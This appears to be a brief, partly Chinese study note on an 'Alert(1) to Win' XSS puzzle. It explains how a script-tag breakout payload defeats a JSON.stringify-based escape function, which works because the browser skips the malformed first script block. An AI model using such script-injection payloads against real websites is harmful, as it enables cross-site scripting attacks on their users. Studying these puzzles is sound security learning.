# Alert(1) to Win
some key fact to know about JavaScript
 * JavaScript 怎麼處理語法錯誤?
```js
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```
attack
```js
// 利用JS handling syntax error - 只有同個<script>中的內容無法執行，其他<script> tag 正常執行！
</script><script>alert(1)//
// 第一個`<script>console.log("</script>`不完整所以會被跳過，第二個`<script>alert(1)//");</script>`會正確執行。
```
